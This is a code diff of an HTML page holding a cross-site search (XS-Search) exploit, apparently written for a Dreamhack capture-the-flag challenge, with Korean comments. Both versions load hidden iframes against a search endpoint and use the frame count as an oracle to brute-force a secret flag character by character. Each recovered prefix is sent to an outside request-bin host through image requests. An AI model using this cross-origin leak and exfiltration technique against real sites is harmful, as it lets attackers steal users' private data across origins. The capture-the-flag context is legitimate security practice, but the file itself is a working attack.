@@ -2,72 +2,70 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XS-Search Debug</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 <body>
-    <h1>XS-Search Site (Debug Mode)</h1>
-    <script>
-        // 1. 타임아웃이 추가된 안전한 search 함수
-        async function search(query) {
-            return new Promise((resolve) => {
-                const ifr = document.createElement('iframe');
-                ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
-                ifr.style.display = 'none';
-                document.body.appendChild(ifr);
+    <h1>XS-Search Site</h1>
 
-                // 로드 성공 시 판별
-                ifr.onload = () => {
-                    const found = ifr.contentWindow.length > 0;
-                    document.body.removeChild(ifr);
-                    resolve(found);
-                };
+        <script>
+            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-                // 2. 500ms 동안 응답 없으면 강제 종료 (매우 중요)
-                setTimeout(() => {
-                    if (document.body.contains(ifr)) {
+            async function search(query) {
+                return new Promise((resolve) => {
+                    const ifr = document.createElement('iframe');
+                    ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
+                    ifr.style.display = 'none';
+                    document.body.appendChild(ifr);
+
+                    ifr.onload = () => {
+                        const found = ifr.contentWindow.length > 0;
                         document.body.removeChild(ifr);
-                        resolve(false);
+                        resolve(found);
                     }
-                }, 500);
-            });
-        }
 
-        async function exploit() {
-            // [확인용] 페이지 로드 즉시 신호 발송
-            new Image().src = `https://uzteakv.request.dreamhack.games?status=started`;
+                    setTimeout(() => {
+                        if (document.body.contains(ifr)) {
+                            document.body.removeChild(ifr);
+                            resolve(false);
+                        }
+                    }, 600);
+                });
+            }
 
-            let chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
-            let secret = "DH{";
+            async function exploit() {
+                new Image().src = `https://dgxjyvd.request.dreamhack.games?start=started`;
 
-            for (let i = 0; i < 40; i++) {
-                let foundAny = false;
+                let chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+                let secret = "DH{";
+                let secret_length = 40;
 
-                for (let c of chars) {
-                    // search의 결과를 result 변수에 명확히 받습니다.
-                    const result = await search(secret + c);
-                    
-                    // [디버깅] 매 시도마다 무조건 RequestBin으로 신호를 보냅니다.
-                    new Image().src = `https://uzteakv.request.dreamhack.games?try=${encodeURIComponent(secret + c)}&res=${result}`;
-                    console.log(`Trying: ${secret + c}, Result: ${result}`);
+                for (let i = 3; i < secret_length; i++) {
+                    let foundAny = false;
 
-                    if (result) {
-                        secret += c;
-                        foundAny = true;
-                        if (c === '}') return;
-                        break;
+                    for (let c of chars) {
+                        await sleep(50);
+
+                        const result = await search(secret + c);
+
+                        if (result) {
+                            secret += c;
+                            new Image().src= `https://dgxjyvd.request.dreamhack.games?found=${encodeURIComponent(secret)}`;
+                            console.log(`Found: ${secret}`);
+                            foundAny = true;
+
+                            if (c === "}") return;
+                            break;
+                        }
+                    }
+
+                    if (!foundAny) {
+                        new Image().src = `https://dgxjyvd.request.dreamhack.games?error=No`;
                     }
                 }
-
-                if (!foundAny) break;
             }
-        }
 
-        // 스크립트 실행
-        exploit().catch(err => {
-            // 에러 발생 시 콘솔에 출력
-            console.error("Exploit Error:", err);
-            new Image().src = `https://wrisagx.request.dreamhack.games?error=${encodeURIComponent(err.message)}`;
-        });
+            exploit();
     </script>
 </body>
 </html>
